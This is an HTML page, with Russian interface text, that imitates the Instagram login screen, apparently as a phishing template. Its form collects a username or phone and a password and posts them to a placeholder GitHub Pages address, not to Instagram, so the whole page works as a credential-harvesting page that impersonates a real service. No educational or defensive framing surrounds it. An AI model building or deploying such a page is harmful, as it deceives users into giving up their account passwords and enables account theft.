<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body {
            background-color: #000;
            color: #fff;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            text-align: center;
            background-color: #222;
            padding: 40px;
            border-radius: 10px;
            width: 350px;
            box-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
        }
        input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #555;
            border-radius: 5px;
            background-color: #333;
            color: #fff;
            font-size: 14px;
            box-sizing: border-box;
        }
        button {
            background-color: #0095f6;
            color: white;
            padding: 12px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            width: 100%;
            font-size: 14px;
            margin: 10px 0;
            box-sizing: border-box;
        }
        button:hover {
            background-color: #007bb5;
        }
        .link {
            color: #0095f6;
            text-decoration: none;
            font-size: 14px;
        }
        p {
            margin: 10px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1 style="font-size: 24px; margin: 0;">Instagram</h1>
        <form action="https://your-github-username.github.io/your-repo-name/submit" method="POST">
            <input type="text" name="username" placeholder="Телефон, имя пользователя или эл. адрес" required>
            <input type="password" name="password" placeholder="Пароль" required>
            <button type="submit">Войти</button>
        </form>
        <p>или</p>
        <button>Войти через Facebook</button>
        <p><a href="#" class="link">Забыли пароль?</a></p>
        <p>У вас нет аккаунта? <a href="#" class="link">Зарегистрироваться</a></p>
    </div>
</body>
</html>
